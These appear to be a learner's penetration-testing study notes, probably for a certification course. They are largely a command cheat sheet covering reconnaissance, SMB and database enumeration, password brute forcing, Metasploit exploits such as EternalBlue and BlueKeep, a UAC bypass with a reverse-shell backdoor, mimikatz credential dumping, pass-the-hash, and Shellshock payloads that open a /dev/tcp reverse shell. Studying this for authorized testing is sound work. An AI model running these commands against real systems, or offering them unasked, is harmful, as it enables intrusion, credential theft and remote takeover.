# Information Gathering

## Passive Information Gathering

We are looking for:

- IP addresses
- Directories hidden from search engines
- Names
- Email addresses
- Phone Numbers
- Physical Addresses
- Web technologies being used

### Common files to look for

- `robots.txt`
- `sitemap.xml` or `sitemaps.xml`

### Basic information about a specific website
```bash
whatweb thesite.domain
```

### Copy an entire website

[https://www.httrack.com/](https://www.httrack.com/)

### WHOIS Enumeration
```bash
whois thesite.domain
```

### Netcraft collection
[https://www.netcraft.com/](https://www.netcraft.com/) 

### DNS Recon

```bash
dnsrecon -d thesite.domain
```

Alternatively use [dnsdumpster.com](http://dnsdumpster.com)

### wafw00f
```bash
##Checks for webapp firewall
wafw00f -a thesite.domain
```

### sublist3r
```bash
##Passive subdomain enumeration with the ability for brute force.
sublist3r -d thesite.domain -e google,yahoo
```

### Google hacking
Database of google hacking: [https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)
```bash
##gives back results that only come from the domain example.com and subdomains. This could be used for enumeration of subdomains and pages.
site:site.com 

##gives back url:s from the specified domain with “admin” in it.
site:site.com inurl:admin 

##this will not show site.com but it will show subdomains instead. 
site:*.site.com 

##Will limit the results with admin in the title for subdomains for the target.
site:*.site.com intitle:admin 

##Shows results of specified filetype.
site:site.com filetype:fileextension 

##Standard search query on the specified site.
site:site.com employees 

##this is a common vulnerability inside webservers.
intitle:"index of"  

##shows you the google web cache for the specified domain. 
cache:site.com

##This searches for passwords and usernames in text files.
inurl:auth_user_file.txt 
```

### theHarvester

The tool gathers emails, names, subdomains, IPs and URLs using multiple public data sources.
While it is a cool tool it is never mentioned again.

```bash
theHarvester -d thesite.domain -b SEARCH,ENGINES
```

### Leaked password databases

[haveibeenpwned.com](http://haveibeenpwned.com) is a very good site for data breaches. If you find an e-mail see if has leaked creds.

## Active Information Gathering

You need proper authorization in order to do this step.

### DNS

Some common types of records
- A - Resolves a hostname or domain to an IPv4 address.
- AAAA - Resolves a hostname or domain to an IPv6 address.
- NS - Reference to the domains nameserver.
- MX - Resolves a domain to a mail server.
- CNAME - Used for domain aliases.
- TXT - Text record.
- HINFO - Host information.
- SOA - Domain authority.
- SRV - Service records.
- PTR - Resolves an IP address to a hostname.


```bash
##DNS lookup utility
#If you ever see two IP addresses returned from this query know that you are dealing with some form of proxy.
host thesite.domain

##Will try a bunch of things including zone transfer but also brute force enumeration of subdomains.
dnsenum target.site

##Standard dig query
dig target.site

##`axfr` is the zone transfer option which will essentially try to perform a zone transfer.
dig axfr @name.server target.site

##Enumeration using fierce. Meant as a precursor to an nmap (or any active) scan.
fierce -dns target.site
```

## Host discovery

```bash
##Getting your own IP address and submask
ip a s

##Pingsweep via nmap
sudo nmap -sn 192.168.1.0/24 #Or whatever CIDR notation you have

##Discovery via ARP using netdiscover
netdiscover -i eth0 -r 192.168.1.0/24 #or whatever CIDR notation you have
```

## Port scanning

```bash
default scan with nmap
nmap $ip #syn scan of IP and top 1000 ports

##Assume that host is online if they are blocking ICMP
nmap -Pn $ip

##Scan all ports instead of just 1000
nmap -Pn -p- $ip

##Scan specific ports
nmap -Pn -p 80,443,3389 $ip

##Scan port range
nmap -Pn -p1-1000 $ip

##Fast scan
nmap -Pn -F $ip

##UDP scan
nmap -Pn -sU $ip

##Service scan
nmap -Pn -sV $ip

##OS scan
nmap -Pn -O $ip

##Default enumeration scripts
nmap -Pn -sC $ip

##Speed template
nmap -Pn -T[0-5] $ip #0 slowest, 5 fastest

##Output to txt file
nmap -Pn $ip -oN output.txt

##Output to xml file
nmap -Pn $ip -oX output.xml


##Aggressive, -A, scan combines -O -sV -sC into one
nmap -Pn -A $ip 

##Example usage
nmap -Pn -F -A -T4 $ip -oN scanoutput.txt
```

# Footprinting & Scanning
### arp-scan
```bash
##Since ARP runs on L2 we need sudo for this command
sudo arp-scan -I eth0 -g 10.1.1.0/16 #-I is the interface, -g Generate from
```

### fping
```bash
##Pings multiple hosts at the same time
fping -I eth0 -g 10.1.1.0/16 -a 2>/dev/null 
#-I interface -g Generate from -a Active 
#The 2>/dev/null removes errors from the output
#0 is standard in, 1 is standard out, 2 is standard error
```

### Nmap
```bash
##UDP scan of port 1-250
nmap $ip -p 1-250 -sU 

##Aggressive scan of specified UDP port
nmap $ip -p $port -sU -A 

##Runs a discovery script
nmap $ip -p $port -sU --script=discovery 

##UDP scan with version enumeration
nmap $ip -p $port -sUV 
```

# Enumeration

## Mounting and deleting a drive on windows through powershell

```bash
## Mounting a drive
net_use <: \\ip\DRIVENAME PASSWORD /user:administrator
## Deleting a drive
net_use * /delete
```

## Nmap smb enumeration scripts

```bash
##Some SMB shares have some ports open on UDP, run this to check the top 25 ports UDP.
nmap $ip -sU --top-port 25 --open

##Identify protocols and dialects
nmap $ip -p 445 --script smb-protocols

##Check what security mode the server is running
nmap $ip -p 445 --script smb-security-mode

##Check what sessions are available on the service
nmap $ip -p 445 --script smb-enum-sessions

**##Passing arguments to nmap scripts is done via  --script-args arg1=val1,arg2=val2 etc.**
##If you find some credentials we can run scripts as a user.
nmap $ip -p 445 --script smb-enum-sessions **--script-args smbusername=username,smbpassword=password**

##Enumerating shares
nmap $ip -p 445 --script smb-enum-shares

##Enumerating users
nmap $ip -p 445 --script smb-enum-users

##Getting the server stats
nmap $ip -p 445 --script smb-server-stats

##Getting the security groups
nmap $ip -p 445 --script smb-enum-groups

##Getting what services are running
nmap $ip -p 445 --script smb-enum-services

##Running multiple scripts and puts the results a textfile.
nmap 10.2.17.87 -p 445 --script smb-protocols,smb-security-mode,smb-enum-sessions,smb-enum-shares,smb-ls,smb-server-stats,smb-enum-domains,smb-enum-users,smb-enum-groups,smb-enum-services --script-args smbusername=user,smbpassword=password -oN nmapSMB.txt
```

## SMBMap

```bash
##Discovering what shared folder and drives are available
smbmap -u guest -p "" -d . -H $ip ##Returns access as guest

##We can do this as an authorized user aswel
smbmap -u administrator -p password -d . -H $ip

##Remote code execution via an authorized user
smbmap -u administrator -p password -d . -H $ip -x 'ipconfig'

##Listing drives on a host
smbmap -u administrator -p password -H $ip -L

##Listing contents of a specific drive 
smbmap -u administrator -p password -H $ip -r 'C$'

##Uploading a file (backdoor in this instance)
smbmap -u administrator -p password -H $ip --upload 'location/of/backdoor.file' 'C$\placement\of\file'

##Downloading files from the server
smbmap -u administrator -p password -H $ip --download 'C$\file\to\download.file'
```

## Samba

```bash
##Query using nmblookup
nmblookup -A $ip

##We can use smbclient to connect to any SMB server
smbclient //$ip/SHARE -N

smbclient -L $ip -N #Getting the description from the server using null session

##Connecting to SMB using rpcclient
rpcclient -U "" -N $ip #N is nopass (null session)

##If we are connected in rpcclient we can type this to get information about the server
rpcclient> srvinfo

##We can also enumerate users while connected
rpcclient> enumdomusers

##Getting SIDs from a specific user
rpcclient> lookupnames admin
```

## Enum4linux

`enum4linux` is an excellent tool for enumeration. It will run everything if nothing is specified

```bash
##Getting the OS version
enum4linux -o $ip

##Enumerating users
enum4linux -U $ip

##Enumerating groups
enum4linux -G $ip

##Getting printer information
enum4linux -i $ip

##Get SIDs
enum4linux -r -u "admin" -p "password" $ip
```

## Metasploit SMB enumeration

```bash
##Setting global variables
setg RHOSTS = 192.168.1.1

##Getting global variable when you have a loaded module
get RHOSTS

##Enumerates the version
use auxiliary/scanner/smb/smb_version

##Checking protocols
use auxiliary/scanner/smb/smb2

##Listing all users
use auxiliary/scanner/smb/smb_enumusers

##Brute-force with metasploit
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/sjare/wordlists/rockyou.txt
set SMBUser username

##Getting named pipes
use auxiliary/scanner/smb/pipe_auditor
set smbuser username
set smbpass password
set RHOST $ip
```

### Dictionary attacks

```bash
##Brute-force with hydra
hydra -l admin -P /usr/share/wordlist/rockhyou.txt $ip smb
```
## Directory Enumeration

```bash
##Directory enumeration with dirb and common.txt wordlist
dirb $url $wordlist
```

## MySQL

Default port: 3306

```bash
##Checking for logins that don't have any password with nmap
nmap $ip -p 3306 --script=mysql_empty_password

##Getting more information about the mysql server
nmap $ip -p 3306 --script=mysql-info

##Enumerating what users are registered via nmap (authenticated)
nmap $ip -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"

##Enumerating databases on the target via nmap (authenticated)
nmap $ip -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"

##Enumerating variables in the database with nmap (authenticated)
nmap $ip -p 3306 --script=mysql-audit --script-args="mysqlaudit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

##Dumping hashes via nmap (authenticated)
nmap $ip -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"

##Running a query via nmap (authenticated)
nmap $ip -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''";

##Checking if file privs can be granted to non admins (authenticated)
nmap $ip -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

##Just connecting to the server with root
mysql -h $ip -u root

##Show all databases
show databases; #Remember to close statements in sql

##Move into a database
use databasename;

##Showing tables in a database
show tables;

##Printing out the information inside a table
select * from tablename;

##Check if we are connected to the fileservice and can read sensitive files
select load_file("/etc/shadow");

##MSF module to check if there are some writeable directories on the target
use auxiliary/scanner/mysql/mysql_writable_dirs

##Dumping hashes from mysql (authenticated)
use auxiliary/scanner/mysql/mysql_hashdump

##Brute force via MSF
use auxiliary/scanner/mysql/mysql_login

```

## MSSQL

Default port: 1433

```bash
##Getting more information from the MSSQL server
nmap $ip -p 1433 --script=ms-sql-info

##Checking the ntml info
nmap $ip -p 1433 --script=ms-sql-ntlm-info --script-args=mssql.instance-port=1433

##Checking for empty passwords
nmap $ip -p 1433 --script=ms-sql-empty-password

##Running a query on the server and place that output in a file (authenticated)
nmap $ip -p 1433 --script=ms-sql-query --script-args=mssql.username=admin,mssql.password=password,ms-sql-query.query="SELECT * FROM * master..syslogins" -oN out.txt

##Dumping hashes from the server (authenticated)
nmap $ip -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=password

##Running commands (Authenticated
nmap $ip -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=password,ms-sql-xp-cmdshell.cmd="ipconfig"

##Brute forcing with MSF
use auxiliary/scanner/mssql/mssql_login

##Enumerating with MSF
use auxiliary/admin/mssql/mssql_enum

##Enumerating logins with MSF
use auxiliary/admin/mssql/mssql_enum_sql_logins

##Running commands with MSF
use auxiliary/admin/mssql/mssql_exec

##Enumerating domain accounts or all available users with MSF
nmap auxiliary/admin/mssql/mssql_enum_domain_accounts
```

# System/Host based attacks

```bash
##Brute forcing WEBDAV with hydra 
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt $ip http-get /webdav/

##Testing connection to webdav with davtest
davtest -url http://$ip/webdav

##Authenticated test against webdav 
davtest -auth bob:password_123321 -url http://$ip/webdav

##Getting a shell on the websdav server using cadaver
cadaver http://$ip/webdav

##Uploading an IIS webdav payload via MSF
use exploit/windows/iis/iis_webdav_upload_asp

##SMB Brute force login with MSF
use auxiliary/scanner/smb/smb_login

##Using psexec to get a CMD session on target (authenticated)
psexec.py $user@$ip cmd.exe

##Using psexec with MSF (authenticated)
use exploit/windows/smb/psexec

##Checking if the target is vulnerable to ms17-010 via nmap
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 $ip

##The ms17-010 aka eternalblue exploit in MSF
use exploit/windows/smb/ms17_101_eternalblue

##Checking if RDP is enabled with MSF
use auxiliary/scanner/rdp/rdp_scanner

##Brute forcing RDP login with hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.16.67 -s 3333 #port

##Connecting to RDP via xfreerdp
xfreerdp /u:$user /p:$password /v:$ip:$rdpport

##Checking if target RDP is vulnerable to bluekeep via MSF
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

##Exploiting bluekeep on target RDP via MSF
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

##Bruteforcing WinRM with crackmapexec
crackmapexec winrm $ip -u $user -p $wordlist

##Running code on target winrm via crackmapexec (authenticated)
crackmapexec winrm $ip -u $user -p $password -x "whoami"

##Getting a shell on target winrm via evil-winrm (authenticated)
evil-winrm.rb -u user -p 'password' -i $ip

##Getting a shell on target winrm via MSF (authenticated)
use exploit/windows/winrm/winrm_script_exec
set force_vbs true

##MSF module for rejetto
use exploit/windows/http/rejetto_hfs_exec
```

## Windows Privilege Escalation

```bash
##Trying to get system in a meterpreter session automatically
getsystem

##Using an MSF module in order to suggest exploits for escalation
use post/multi/recon/local_exploit_suggester

##Using windows-exploit-suggester
windows-exploit-suggester.py --database MY-DATABASE.xlsx --systeminfo THE-TARGET-SYSINFO.txt

##Uploading a file via MSF
upload /path/to/my/file.exe
```

### Bypassing UAC

```bash
##Create a payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$localIP LPORT=$localPort -f exe > backdoor.exe

##Set the same payload in msfv multi/handler
set payload windows/meterpreter/reverse_tcp

##Upload the backdoor to the target from MSF
upload /directory/backdoor.exe

##Upload Akagi64
upload Desktop/tools/UACME/Akagi64.exe

##Open a shell session on the target and run the backdoor through akagi64 with option 23
C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe

##This session should then be caught in our multi/handler with elevated privs
##Why key 23? 
##Key 23 is recommended to test out since it has worked quite well in the past
```

### Access token impersonation aka Potato attacks

```bash
##Check the privs in meterpreter
getprivs

##The following are the privileges that are required for impersonation attacks. We need at least one of these
#This allows a user to impersonate tokens.
SeAssignPrimaryToken
#This allows a user to create an arbitrary token with administrative privileges.
SeCreateToken
#This allows a user to create a process under the security context of another user typically with administrative privileges.
SeImpersonatePrivilege

##Loading up the incognito module in meterpreter
load incognito

##Listing available tokens
list_tokens -u

##Impersonating a token
impersonate_token "DOMAIN\User"
#Recommended to migrate to another process with NTAUTH after this.
```

```bash
##Hiding winpeas (or any file for that matter) in an alternate data stream
type payload.exe > sometextfile.txt:winpeas.exe

##Creating a link to the payload that runs every time a command is triggered
#Inside system32 on windows (elevated)
mklink wupdate.exe C:\Temp\sometextfile.txt:winpeas.exe
```

# Msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=$MYPORT -f ext > name.ext
```

# Windows Credential Dumping

```bash
##Dumping all hashes from the SAM in meterpreter
hashdump
**admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Username:Relative Identification (RID):LM hash:NTLM hash:::**

##Make sure to look for the unattend.xml file in 
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\Autounattend.xml

##Decoding base64
base64 -d encoded.txt > decoded.txt

##Migrate into lsass and load kiwi
pgrep lsass
load kiwi

##Dump all credentials
creds_all

##Dump credentials from SAM for all users
lsa_dump_sam

##Sometimes we can get cleartext passwords from the LSA secrets
lsa_dump_secrets

##Dumping credentals with mimikatz
lsadump::sam
lsadump::secrets

##Displaying logon passwords with mimikatz
sekurlsa::logonpasswords

#If the system is configured to not display cleartext passwords it will display as
(null)

##Pass the hash with MSF
set SMBPass ::NTLMHASH::

##Pass the hash with psexec
crackmapexec smb $ip -u Administrator -H "::NTLM HASH::" -x "net user set password"
```

# Windows Certutil

```bash
##Downloading a file in a shell
certutil -urlcache -f http://10.10.18.2/payload.exe payload.exe
```

# Linux

```bash
##If there is a .cgi script running on the site we could use the shellshock vuln
#Checking a url with nmap
nmap -sV $ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"

##Injecting commands into the useragent request
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/$LHOST/$LPORT 0>&1'

##Shellshock with MSF
use exploit/multi/http/apache_mod_cgi_bash_env_exec

##Searching for nmap scripts (ftp as example)
ls -la /usr/share/nmap/scripts/ | grep ftp-*

##Enumerating samba shares using smbmap
smbmap -H $ip -u user -p password

##Connecting to smb/samba
smbclient //$ip/SHARENAME -U user

##Enumerating target with enum4linux
enum4linux -a -u user -p password $ip
```

# Network-based attacks
I actually didn't think this section gave me really anything and the explanations were not really good enough.

# Metasploit
Excellent material. This is going to be a huge section.

# Exploitation
Excellent material.

# Post-Exploitation
Excellent material.

# Social engineering
This feels tacked on.

# Web Application Penetration Testing
The concepts and foundational knowledge is not explained good enough. Don't even think the OWASP top 10 is mentioned once. 
If you've got the time use burp academy here instead or go through the Junior Penetration Tester path on tryhackme.